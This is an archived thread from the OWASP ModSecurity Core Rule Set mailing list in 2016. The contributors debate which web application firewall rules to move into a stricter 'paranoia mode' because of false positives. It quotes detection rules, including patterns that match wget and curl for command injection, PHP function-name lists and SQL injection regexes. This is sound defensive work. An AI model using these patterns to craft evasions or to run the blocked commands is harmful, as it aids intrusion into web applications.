From christian.folini at netnea.com  Mon Feb  1 08:12:02 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Mon, 1 Feb 2016 09:12:02 +0100
Subject: [Owasp-modsecurity-core-rule-set] Rules triggering False
 Positives frequently
In-Reply-To: <EC1872C3-68A9-4919-BA3E-50A81E59DF48@spam.lifeforms.nl>
References: <20160118043018.GA20460@elias>
	<EC1872C3-68A9-4919-BA3E-50A81E59DF48@spam.lifeforms.nl>
Message-ID: <20160201081202.GA1369@elias>

Good morning Walter,

Thank you for your detailed info and the remarks on the wiki page. This
is exactly what we need to get a broader view on the problems to make
informed decisions.

It looks as if we agree in most cases. Where I am not sure if we really
agree, I plan to take the discussion here to come to a conclusion.

On Sat, Jan 30, 2016 at 05:13:06PM +0100, Walter Hop wrote:
> 3) Rules from subdirectories in v2 which are no longer in v3.0.0-rc1, but we want to bring them back in paranoid mode because we think they do have worth. Bringing these rules back does not affect security for normal mode users. (experimental_rules, optional_rules, slr_rules)
>
> I have looked at these, but I would recommend that more people look at them too. Most of them are uninteresting to me, so it's fine that they are removed. The slr_rules look quite outdated in particular. It's worth looking through experimental_rules and optional_rules though. I have added some possible candidates for us here, although I have no experience with them in production, so maybe Chaim can chime in if there are strong reasons for keeping them removed: https://www.owasp.org/index.php/OWASP_ModSec_CRS_Paranoia_Mode#Optional.2C_experimental.2C_slr_rules

Looking into these three separate subfolders is very useful. I was
willing to omit this work in order to push things ahead. It is very
good that at least you took a closer look. It would be even better if
somebody else would repeat this effort.


> Finally, I noticed that some candidates might be considered paranoid but are currently already in the normal mode at notice_anomaly_score level (for example, User-Agent, Accept, Host header existence checks). These rules do not block in isolation, so we should keep in mind that the possible negative impact of FP on them is limited. Maybe it would be a useful task to add the scoring level as a column in the wiki.

As 90% of the rules are on critical, I think a remark in the remark
column would do.

I think some of these might be cloning-candidates:
In standard mode, they are anomaly level "notice". When in paranoid
mode, the same rule is repeated, but with anomaly level "warning".
That way you end up with up with "notice" + "warning" = "critical".

> In fact, we might even consider that any paranoid rules are possibly worth keeping in the 'normal mode' as lower-scoring rules - and just have paranoid mode bump up their score level, e.g. from 2 to 5. After all, if a normal user would consider the occurrence of 3 harmless protocol violations as a valid blocking heuristic, why not the occurrence of 3 paranoid rules? This last situation might be probably more predictive of an attack.

This!

The other option I have in mind is repeating rules with stricter limits.
To give you an example:
960901/920270 does @validateByteRange 1-255.
In paranoid mode, the same rule could be repeated with @validateByteRange 32-126.

Ahoj,

Christian



-- 
There has grown in the minds of certain groups in this country the idea 
that just because a man or corporation has made a profit out of the public 
for a number of years, the government and the courts are charged with 
guaranteeing such a profit in the future, even in the face of changing 
circumstances and contrary to public interest. This strange doctrine is 
supported by neither statute or common law. Neither corporations or 
individuals have the right to come into court and ask that the clock 
of history be stopped, or turned back.
--- Robert Heinlein, Life-Line, 1939

From christian.folini at netnea.com  Tue Feb  2 08:06:00 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Tue, 2 Feb 2016 09:06:00 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
	candidate 950120 / 931130 (Possible RFI)
Message-ID: <20160202080600.GA29931@elias>

Hello,

Walter has added substantial feedback on the list of possible paranoia
mode candidates. I think 8 candidates are controversial (out of about 45
candidates).

I'd like to discuss them here one by one.

Controversial Paranoia Mode Candidate 950120 (2.2.X) / 931130 (3.0.0rc1)
msg: Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link 

Rule in 2.2.9:
SecRule ARGS "^(?:ht|f)tps?://(.*)$" \
        "chain,phase:2,rev:'3',ver:'OWASP_CRS/2.2.9',maturity:'9',accuracy:'9',t:none,capture,ctl:auditLogParts=+E,block,msg:'Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link',logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',id:'950120',severity:'2',tag:'OWASP_CRS/WEB_ATTACK/RFI'"
        SecRule TX:1 "!@beginsWith %{request_headers.host}" "setvar:'tx.msg=%{rule.msg}',setvar:tx.anomaly_score=+%{tx.critical_anomaly_score},setvar:tx.%{rule.id}-OWASP_CRS/WEB_ATTACK/RFI-%{matched_var_name}=%{tx.1}"

Rule in 3.0.0rc1:
SecRule ARGS "^(?:ht|f)tps?://(.*)$" \
	"chain,\
	phase:request,\
	rev:'3',\
	ver:'OWASP_CRS/3.0.0',\
	maturity:'9',\
	accuracy:'9',\
	t:none,\
	capture,\
	ctl:auditLogParts=+E,\
	block,\
	msg:'Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link',\
	logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\
	id:'931130',\
	severity:'CRITICAL',\
        tag:'application-multi',\
        tag:'language-multi',\
        tag:'platform-multi',\
        tag:'attack-remote file inclusion',\
	tag:'OWASP_CRS/WEB_ATTACK/RFI'"
        	SecRule TX:1 "!@beginsWith %{request_headers.host}" \
			"setvar:'tx.msg=%{rule.msg}',\
			setvar:tx.rfi_score=+%{tx.critical_anomaly_score},\
			setvar:tx.anomaly_score=+%{tx.critical_anomaly_score},\
			setvar:tx.%{rule.id}-OWASP_CRS/WEB_ATTACK/RFI-%{matched_var_name}=%{tx.1}"

Rule in 2.2.9:
SecRule ARGS "^(?:ht|f)tps?://(.*)$" \
        "chain,phase:2,rev:'3',ver:'OWASP_CRS/2.2.9',maturity:'9',accuracy:'9',t:none,capture,ctl:auditLogParts=+E,block,msg:'Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link',logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',id:'950120',severity:'2',tag:'OWASP_CRS/WEB_ATTACK/RFI'"
        SecRule TX:1 "!@beginsWith %{request_headers.host}" "setvar:'tx.msg=%{rule.msg}',setvar:tx.anomaly_score=+%{tx.critical_anomaly_score},setvar:tx.%{rule.id}-OWASP_CRS/WEB_ATTACK/RFI-%{matched_var_name}=%{tx.1}"


In my blogpost at
https://www.netnea.com/cms/2016/01/17/most-frequent-false-positives-triggered-by-owasp-modsecurity-core-rules-2-2-x/
I identified the said rule as one with very few false positives. Walter however brought it up as a rule with many false positives.

A wider perspective is thus needed.

Does anybody has anything to add?

Best,

Christian


-- 
mailto:christian.folini at netnea.com
http://www.christian-folini.ch
twitter: @ChrFolini

From christian.folini at netnea.com  Tue Feb  2 08:17:18 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Tue, 2 Feb 2016 09:17:18 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
 candidate 950907 / 932100 (System command injection)
Message-ID: <20160202081718.GB29931@elias>

Hello,

I'd like to discuss them here one by one.

Controversial Paranoia Mode Candidate 950907 (2.2.X) / 932100 (3.0.0rc1)
msg: Sytem Command Injection

Rule in 2.2.9:
SecRule REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|!REQUEST_COOKIES:/_pk_ref/|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/* "(?i:(?:[\;\|\`]\W*?\bcc|\b(wget|curl))\b|\/cc(?:[\'\"\|\;\`\-\s]|$))" \
		"phase:2,rev:'2',ver:'OWASP_CRS/2.2.9',maturity:'9',accuracy:'8',capture,t:none,t:normalisePath,ctl:auditLogParts=+E,block,msg:'System Command Injection',id:'950907',tag:'OWASP_CRS/WEB_ATTACK/COMMAND_INJECTION',tag:'WASCTC/WASC-31',tag:'OWASP_TOP_10/A1',tag:'PCI/6.5.2',logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',severity:'2',setvar:'tx.msg=%{rule.msg}',setvar:tx.anomaly_score=+%{tx.critical_anomaly_score},setvar:tx.%{rule.id}-OWASP_CRS/WEB_ATTACK/COMMAND_INJECTION-%{matched_var_name}=%{tx.0},skipAfter:END_COMMAND_INJECTION1"

Rule in 3.0.0rc1:
SecRule REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/* "@pmf os-commands.data" \
	"msg:'Remote Command Execution (RCE) Attempt',\
	phase:request,\
	rev:'2',\
	ver:'OWASP_CRS/3.0.0',\
	maturity:'9',\
	accuracy:'8',\
	capture,\
	t:none,t:normalisePath,\
	ctl:auditLogParts=+E,\
	block,\
	id:'932100',\
	tag:'application-multi',\
	tag:'language-multi',\
	tag:'platform-multi',\
	tag:'attack-remote code execution',\
	tag:'OWASP_CRS/WEB_ATTACK/COMMAND_INJECTION',\
	tag:'WASCTC/WASC-31',\
	tag:'OWASP_TOP_10/A1',\
	tag:'PCI/6.5.2',\
	logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\
	severity:'CRITICAL',\
	chain"
		SecRule MATCHED_VARS "@rx [`;\|&\r\n].*?(\.exe)?(\s+[-/])?.+[&<>\|]*?" \
			"capture,\
			setvar:'tx.msg=%{rule.msg}',\
        		setvar:tx.rce_score=+%{tx.critical_anomaly_score},\
			setvar:tx.anomaly_score=+%{tx.critical_anomaly_score},\
        		setvar:tx.%{rule.id}-OWASP_CRS/WEB_ATTACK/RCE-%{matched_var_name}=%{tx.0}"


This rule is controversial for different reasons than the one in the previous post.

It was a simple regex in 2.2.X. For 3.0.0 it has been enriched with a
data file:
https://raw.githubusercontent.com/SpiderLabs/owasp-modsecurity-crs/v3.0.0-rc1/rules/os-commands.data

In a response to my blogpost 
https://www.netnea.com/cms/2015/12/20/modsec-crs-2-2-x-vs-3-0-0-dev/
Chaim conceded the 3.0.0 version is still plagued by a lot of false
positives. Obviously so, if you look at the commands. After all, unix
commands are close to natural English for a good reason.

Now Franziska (collaborating on the paranoia mode) and I wonder if 
it would not make sense to split
os-commands.data into two or more files. The commands with few
false positives would remain in the standard file, commands generating
lots of false positives could then be moved into
os-commands-paranoia.data and be referenced in a separate rule
copying the behaviour of the standard rule.

Thoughts?

Christian

-- 
mailto:christian.folini at netnea.com
http://www.christian-folini.ch
twitter: @ChrFolini

From christian.folini at netnea.com  Tue Feb  2 08:25:02 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Tue, 2 Feb 2016 09:25:02 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
 candidate 958977 / 933110 and 958979 / 933120 (PHP Injection Attacks)
Message-ID: <20160202082502.GC29931@elias>

Hello,

Like the previous post on 950907 / 932100, this is controversial because
of possible false positives due to a data file with strings:
https://raw.githubusercontent.com/SpiderLabs/owasp-modsecurity-crs/v3.0.0-rc1/rules/php-function-names.data
https://raw.githubusercontent.com/SpiderLabs/owasp-modsecurity-crs/v3.0.0-rc1/rules/php-config-directives.data

Could these files be split in the manner explained in the message
before?

After all, this rule scans input against strings like
dl, eval, exec, from, precision.

Outside of that, there is something I do not quite grasp:
Why are the strings in
https://raw.githubusercontent.com/SpiderLabs/owasp-modsecurity-crs/v3.0.0-rc1/rules/php-function-names.data
listed between slashes (this is not the case with the other data files).
Examples:
...
/ereg/
/eregi/
/error_log/
/eval/
/event_buffer_new/
...

What do you think?


Christian


-- 
mailto:christian.folini at netnea.com
http://www.christian-folini.ch
twitter: @ChrFolini
-- 
mailto:christian.folini at netnea.com
http://www.christian-folini.ch
twitter: @ChrFolini

From christian.folini at netnea.com  Tue Feb  2 08:32:57 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Tue, 2 Feb 2016 09:32:57 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
 candidate 960015 / 920300 and 960017 / 920350 (Header issues)
Message-ID: <20160202083257.GD29931@elias>

Hello,

The discussion on these two rules can be combined, I think.

2.2.X rule 960015 (3.0.0rc1 rule 920300) "Request Missing an
Accept Header) is simple enough. Accept headers are mandatory
thus a client request lacking an accept header is thus illegal.

The problem: A lack of accept headers is widespread and ModSecurity
is not going to fix the internet. Instead, we are generating
false positives and pester our clients (if we block them based on 
this rule triggering).

Moving this false positives generator to the paranoia mode seems
a good move. But your view might vary.

With 960017 / 920350 (Host header is a numeric IP address), 
the situation is slightly different. We agree it is a frequent
source of false positives, but Walter thinks it is not legitimate
users that are affected, but mass scanners. In my experience
it is load balancers and health checkers which fall into this
category as well. And stopping scanners is possibly behind the
scope of a ModSec Core Rules vanilla install.

So what do we do with this rule?

Ahoj,

Christian

-- 
mailto:christian.folini at netnea.com
http://www.christian-folini.ch
twitter: @ChrFolini

From christian.folini at netnea.com  Tue Feb  2 08:44:57 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Tue, 2 Feb 2016 09:44:57 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
 candidate 970901 / 950100 (Application returning 500)
Message-ID: <20160202084457.GE29931@elias>

Hi!

This is a juicy one.

Rule in 2.2.9:
SecRule RESPONSE_STATUS "^5\d{2}$" "phase:4,rev:'2',ver:'OWASP_CRS/2.2.9',maturity:'9',accuracy:'9',t:none,capture,ctl:auditLogParts=+E,block,msg:'The application is not available',logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',id:'970901',tag:'WASCTC/WASC-13',tag:'OWASP_TOP_10/A6',tag:'PCI/6.5.6',severity:'3',setvar:'tx.msg=%{rule.msg}',setvar:tx.outbound_anomaly_score=+%{tx.error_anomaly_score},setvar:tx.anomaly_score=+%{tx.error_anomaly_score},setvar:tx.%{rule.id}-AVAILABILITY/APP_NOT_AVAIL-%{matched_var_name}=%{tx.0}"

Rule in 3.0.0rc1:
SecRule RESPONSE_STATUS "^5\d{2}$" \
	"phase:response,\
	rev:'3',\
	ver:'OWASP_CRS/3.0.0',\
	maturity:'9',\
	accuracy:'9',\
	t:none,\
	capture,\
	ctl:auditLogParts=+E,\
	block,\
	msg:'The Application Returned a 500-Level Status Code',\
	logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\
	id:'950100',\
	tag:'application-multi',\
	tag:'language-multi',\
	tag:'platform-multi',\
	tag:'attack-information disclosure',\
	tag:'WASCTC/WASC-13',\
	tag:'OWASP_TOP_10/A6',\
	tag:'PCI/6.5.6',\
	severity:'ERROR',\
	setvar:'tx.msg=%{rule.msg}',\
	setvar:tx.outbound_anomaly_score=+%{tx.error_anomaly_score},\
	setvar:tx.anomaly_score=+%{tx.error_anomaly_score},\
	setvar:tx.%{rule.id}-AVAILABILITY/APP_NOT_AVAIL-%{matched_var_name}=%{tx.0}"

Obviously we check the HTTP response status code and trigger an alert on 
a status 500. It is one of the rare rules with anomaly score error (=4)
as opposed to critical (=5).

Franziska thinks this is too generic and cloaks backend misbehaviour.
(If you have a problem with the error page, then replace it!), but let's
not hide the fact of the error from the client.

Now Walter thinks this rule plays a role when defending against blind
attacks where the difference between 403 (likely blocked by ModSecurity) 
and 500 (passed ModSecurity, but crashed on backend) gives an attacker
important information.

Initially, I wanted to push this rule into paranoia mode. But now I am
not so sure anymore for Walter does have a point.

However, the inexperienced administrator could have a hard time
indentifying the 403 status as a backend failure. So maybe it is still
a paranoia candidate despite it's supportive role when defending against
blind injection attacks.

More brain cycles are definitely needed here!

Christian


-- 
mailto:christian.folini at netnea.com
http://www.christian-folini.ch
twitter: @ChrFolini

From christian.folini at netnea.com  Tue Feb  2 09:15:15 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Tue, 2 Feb 2016 10:15:15 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
 candidate 981244 / 942180 and 981248 / 942210 (More SQL stuff)
Message-ID: <20160202091515.GF29931@elias>

Dear all,

The case with 981244 / 942180 (Detects basic SQL authentication
bypass attempts 1/3) and 981242 / 942210 (Detects chaines SQLI injection
attempts 1/2) is similar.

I think they warrant for frequent or very frequent false positives and
Walter thinks they don't.

Rule 2.2.X: 981244:
SecRule REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|!REQUEST_COOKIES:/_pk_ref/|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/* "(?i:(?i:\d[\"'`???]\s+[\"'`???]\s+\d)|(?:^admin\s*?[\"'`???]|(\/\*)+[\"'`???]+\s?(?:--|#|\/\*|{)?)|(?:[\"'`???]\s*?\b(x?or|div|like|between|and)\b\s*?[+<>=(),-]\s*?[\d\"'`???])|(?:[\"'`???]\s*?[^\w\s]?=\s*?[\"'`???])|(?:[\"'`???]\W*?[+=]+\W*?[\"'`???])|(?:[\"'`???]\s*?[!=|][\d\s!=+-]+.*?[\"'`???(].*?$)|(?:[\"'`???]\s*?[!=|][\d\s!=]+.*?\d+$)|(?:[\"'`???]\s*?like\W+[\w\"'`???(])|(?:\sis\s*?0\W)|(?:where\s[\s\w\.,-]+\s=)|(?:[\"'`???][<>~]+[\"'`???]))" "phase:2,capture,t:none,t:urlDecodeUni,block,msg:'Detects basic SQL authentication bypass attempts 1/3',id:'981244',tag:'OWASP_CRS/WEB_ATTACK/SQL_INJECTION',logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',severity:'2',setvar:'tx.msg=%{rule.id}-%{rule.msg}',setvar:tx.sql_injection_score=+1,setvar:tx.anomaly_score=+%{tx.critical_anomaly_score},setvar:'tx.%{tx.msg}-OWASP_CRS/WEB_ATTACK/SQLI-%{matched_var_name}=%{tx.0}'"

Rule 3.0.0rc1: 942180:
SecRule REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/* "(?i:(?i:\d[\"'`]\s+[\"'`]\s+\d)|(?:^admin\s*?[\"'`]|(\/\*)+[\"'`]+\s?(?:--|#|\/\*|{)?)|(?:[\"'`]\s*?(x?or|div|like|between|and)[\w\s-]+\s*?[+<>=(),-]\s*?[\d\"'`])|(?:[\"'`]\s*?[^\w\s]?=\s*?[\"'`])|(?:[\"'`]\W*?[+=]+\W*?[\"'`])|(?:[\"'`]\s*?[!=|][\d\s!=+-]+.*?[\"'`(].*?$)|(?:[\"'`]\s*?[!=|][\d\s!=]+.*?\d+$)|(?:[\"'`]\s*?like\W+[\w\"'`(])|(?:\sis\s*?0\W)|(?:where\s[\s\w\.,-]+\s=)|(?:[\"'`][<>~]+[\"'`]))" \
	"phase:request,\
        rev:'2',\
        ver:'OWASP_CRS/3.0.0',\
        maturity:'9',\
        accuracy:'8',\
	capture,\
	t:none,t:urlDecodeUni,\
	block,\
	msg:'Detects basic SQL authentication bypass attempts 1/3',\
	id:'942180',\
	tag:'application-multi',\
	tag:'language-mutli',\
	tag:'platform-multi',\
	tag:'attack-sqli',\
	tag:'OWASP_CRS/WEB_ATTACK/SQL_INJECTION',\
	logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\
	severity:'CRITICAL',\
	setvar:'tx.msg=%{rule.msg}',\
	setvar:tx.sql_injection_score=+%{tx.critical_anomaly_score},\
	setvar:tx.anomaly_score=+%{tx.critical_anomaly_score},\
	setvar:'tx.%{rule.id}-OWASP_CRS/WEB_ATTACK/SQLI-%{matched_var_name}=%{tx.0}'"


And here is the 2nd pair with the same issue:

Rule 2.2.X: 981248:
SecRule REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|!REQUEST_COOKIES:/_pk_ref/|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/* "(?i:(?:@.+=\s*?\(\s*?select)|(?:\d+\s*?(x?or|div|like|between|and)\s*?\d+\s*?[\-+])|(?:\/\w+;?\s+(?:having|and|x?or|div|like|between|and|select)\W)|(?:\d\s+group\s+by.+\()|(?:(?:;|#|--)\s*?(?:drop|alter))|(?:(?:;|#|--)\s*?(?:update|insert)\s*?\w{2,})|(?:[^\w]SET\s*?@\w+)|(?:(?:n?and|x?x?or|div|like|between|and|not |\|\||\&\&)[\s(]+\w+[\s)]*?[!=+]+[\s\d]*?[\"'`???=()]))" "phase:2,capture,t:none,t:urlDecodeUni,block,msg:'Detects chained SQL injection attempts 1/2',id:'981248',tag:'OWASP_CRS/WEB_ATTACK/SQL_INJECTION',logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',severity:'2',setvar:'tx.msg=%{rule.id}-%{rule.msg}',setvar:tx.sql_injection_score=+1,setvar:tx.anomaly_score=+%{tx.critical_anomaly_score},setvar:'tx.%{tx.msg}-OWASP_CRS/WEB_ATTACK/SQLI-%{matched_var_name}=%{tx.0}'"


Rule 3.0.0rc1: 942180:
SecRule REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/* "(?i:(?i:\d[\"'`]\s+[\"'`]\s+\d)|(?:^admin\s*?[\"'`]|(\/\*)+[\"'`]+\s?(?:--|#|\/\*|{)?)|(?:[\"'`]\s*?(x?or|div|like|between|and)[\w\s-]+\s*?[+<>=(),-]\s*?[\d\"'`])|(?:[\"'`]\s*?[^\w\s]?=\s*?[\"'`])|(?:[\"'`]\W*?[+=]+\W*?[\"'`])|(?:[\"'`]\s*?[!=|][\d\s!=+-]+.*?[\"'`(].*?$)|(?:[\"'`]\s*?[!=|][\d\s!=]+.*?\d+$)|(?:[\"'`]\s*?like\W+[\w\"'`(])|(?:\sis\s*?0\W)|(?:where\s[\s\w\.,-]+\s=)|(?:[\"'`][<>~]+[\"'`]))" \
	"phase:request,\
        rev:'2',\
        ver:'OWASP_CRS/3.0.0',\
        maturity:'9',\
        accuracy:'8',\
	capture,\
	t:none,t:urlDecodeUni,\
	block,\
	msg:'Detects basic SQL authentication bypass attempts 1/3',\
	id:'942180',\
	tag:'application-multi',\
	tag:'language-mutli',\
	tag:'platform-multi',\
	tag:'attack-sqli',\
	tag:'OWASP_CRS/WEB_ATTACK/SQL_INJECTION',\
	logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\
	severity:'CRITICAL',\
	setvar:'tx.msg=%{rule.msg}',\
	setvar:tx.sql_injection_score=+%{tx.critical_anomaly_score},\
	setvar:tx.anomaly_score=+%{tx.critical_anomaly_score},\
	setvar:'tx.%{rule.id}-OWASP_CRS/WEB_ATTACK/SQLI-%{matched_var_name}=%{tx.0}'"



Based on my experience running many, many
sites with the core rules, I would rather move them into paranoia mode.
Even more so as the other rules in their group are clearer candidates
for the paranoia mode and leaving them in standard and moving their
siblings is a bit odd.

Thoughts?

Christian


-- 
mailto:christian.folini at netnea.com
http://www.christian-folini.ch
twitter: @ChrFolini

From modsec at spam.lifeforms.nl  Tue Feb  2 13:02:13 2016
From: modsec at spam.lifeforms.nl (Walter Hop)
Date: Tue, 2 Feb 2016 14:02:13 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
	candidate 950120 / 931130 (Possible RFI)
In-Reply-To: <20160202080600.GA29931@elias>
References: <20160202080600.GA29931@elias>
Message-ID: <8F47FE1E-C1DA-4B07-85FD-3A8C2E3B119C@spam.lifeforms.nl>

Hi Christian,

Thanks, that?s a nice torrent of mail you sent there! :) I?ll have time to look at the rules next weekend, although maybe I?ll sneak in a few replies before that.

Before making a good judgement call on SQLi and XSS related rules, I still need to know a bit more about libinjection.

We should recommend moving a rule into paranoia if its cost is too high relative to its benefit.
But, for SQLi and XSS rules, this depends on libinjection, which I haven?t really exercised yet.

If libinjection in itself already has a high sensitivity, the benefits of the regexp based rules will become lower. After all, an attack will then likely already be flagged without those rules. In that case, we could move rules from normal to paranoid mode, or dismiss currently removed rules, much more easily.

I don?t quite have a good feel about this factor yet, so I really want to launch some tests against it, but it will probably be Saturday before I have the time to do that.

Cheers!
WH

-- 
Walter Hop | PGP key: https://lifeforms.nl/pgp

-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160202/151070af/attachment.html>

From morris at eml.cc  Tue Feb  2 13:43:23 2016
From: morris at eml.cc (Morris Taylor)
Date: Tue, 02 Feb 2016 21:43:23 +0800
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
 candidate 950907 / 932100 (System command injection)
In-Reply-To: <20160202081718.GB29931@elias>
References: <20160202081718.GB29931@elias>
Message-ID: <1454420603.2320941.509590058.2A72CBFA@webmail.messagingengine.com>

Dear Christian,

    Dividing the pm file into several parts for eliminating false
    positive sounds good for me. Should there be another rule id for
    carrying the pm file for being associated with the paranoia mode
    one? Thanks!

-- 
BR, Morris

On Tue, Feb 2, 2016, at 04:17 PM, Christian Folini wrote:
> Hello,
> 
> I'd like to discuss them here one by one.
> 
> Controversial Paranoia Mode Candidate 950907 (2.2.X) / 932100 (3.0.0rc1)
> msg: Sytem Command Injection
> 
> Rule in 2.2.9:
> SecRule
> REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|!REQUEST_COOKIES:/_pk_ref/|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/*
> "(?i:(?:[\;\|\`]\W*?\bcc|\b(wget|curl))\b|\/cc(?:[\'\"\|\;\`\-\s]|$))" \
> 		"phase:2,rev:'2',ver:'OWASP_CRS/2.2.9',maturity:'9',accuracy:'8',capture,t:none,t:normalisePath,ctl:auditLogParts=+E,block,msg:'System Command Injection',id:'950907',tag:'OWASP_CRS/WEB_ATTACK/COMMAND_INJECTION',tag:'WASCTC/WASC-31',tag:'OWASP_TOP_10/A1',tag:'PCI/6.5.2',logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',severity:'2',setvar:'tx.msg=%{rule.msg}',setvar:tx.anomaly_score=+%{tx.critical_anomaly_score},setvar:tx.%{rule.id}-OWASP_CRS/WEB_ATTACK/COMMAND_INJECTION-%{matched_var_name}=%{tx.0},skipAfter:END_COMMAND_INJECTION1"
> 
> Rule in 3.0.0rc1:
> SecRule
> REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/*
> "@pmf os-commands.data" \
> 	"msg:'Remote Command Execution (RCE) Attempt',\
> 	phase:request,\
> 	rev:'2',\
> 	ver:'OWASP_CRS/3.0.0',\
> 	maturity:'9',\
> 	accuracy:'8',\
> 	capture,\
> 	t:none,t:normalisePath,\
> 	ctl:auditLogParts=+E,\
> 	block,\
> 	id:'932100',\
> 	tag:'application-multi',\
> 	tag:'language-multi',\
> 	tag:'platform-multi',\
> 	tag:'attack-remote code execution',\
> 	tag:'OWASP_CRS/WEB_ATTACK/COMMAND_INJECTION',\
> 	tag:'WASCTC/WASC-31',\
> 	tag:'OWASP_TOP_10/A1',\
> 	tag:'PCI/6.5.2',\
> 	logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\
> 	severity:'CRITICAL',\
> 	chain"
> 		SecRule MATCHED_VARS "@rx [`;\|&\r\n].*?(\.exe)?(\s+[-/])?.+[&<>\|]*?" \
> 			"capture,\
> 			setvar:'tx.msg=%{rule.msg}',\
>         		setvar:tx.rce_score=+%{tx.critical_anomaly_score},\
> 			setvar:tx.anomaly_score=+%{tx.critical_anomaly_score},\
>         		setvar:tx.%{rule.id}-OWASP_CRS/WEB_ATTACK/RCE-%{matched_var_name}=%{tx.0}"
> 
> 
> This rule is controversial for different reasons than the one in the
> previous post.
> 
> It was a simple regex in 2.2.X. For 3.0.0 it has been enriched with a
> data file:
> https://raw.githubusercontent.com/SpiderLabs/owasp-modsecurity-crs/v3.0.0-rc1/rules/os-commands.data
> 
> In a response to my blogpost 
> https://www.netnea.com/cms/2015/12/20/modsec-crs-2-2-x-vs-3-0-0-dev/
> Chaim conceded the 3.0.0 version is still plagued by a lot of false
> positives. Obviously so, if you look at the commands. After all, unix
> commands are close to natural English for a good reason.
> 
> Now Franziska (collaborating on the paranoia mode) and I wonder if 
> it would not make sense to split
> os-commands.data into two or more files. The commands with few
> false positives would remain in the standard file, commands generating
> lots of false positives could then be moved into
> os-commands-paranoia.data and be referenced in a separate rule
> copying the behaviour of the standard rule.
> 
> Thoughts?
> 
> Christian
> 
> -- 
> mailto:christian.folini at netnea.com
> http://www.christian-folini.ch
> twitter: @ChrFolini
> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list
> Owasp-modsecurity-core-rule-set at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set

From christian.folini at netnea.com  Thu Feb  4 09:08:26 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Thu, 4 Feb 2016 10:08:26 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
 candidate 950120 / 931130 (Possible RFI)
In-Reply-To: <8F47FE1E-C1DA-4B07-85FD-3A8C2E3B119C@spam.lifeforms.nl>
References: <20160202080600.GA29931@elias>
	<8F47FE1E-C1DA-4B07-85FD-3A8C2E3B119C@spam.lifeforms.nl>
Message-ID: <20160204090826.GA27990@elias>

Hello Walter,

On Tue, Feb 02, 2016 at 02:02:13PM +0100, Walter Hop wrote:
> Thanks, that?s a nice torrent of mail you sent there! :) I?ll have time to look at the rules next weekend, although maybe I?ll sneak in a few replies before that.

Cool.

> Before making a good judgement call on SQLi and XSS related rules, I still need to know a bit more about libinjection.
> 
> We should recommend moving a rule into paranoia if its cost is too high relative to its benefit.
> But, for SQLi and XSS rules, this depends on libinjection, which I haven?t really exercised yet.

Libinjection has been around for a few years. I always considered it
underdocumented and too much of a one man show. After my rant in
https://www.netnea.com/cms/2015/12/20/modsec-crs-2-2-x-vs-3-0-0-dev/
I got in touch with the developer Nick Galbreath who admitted many
shortcomings and promised to clean up his project. In fact we are seeing
more activity with libinjection on github now 
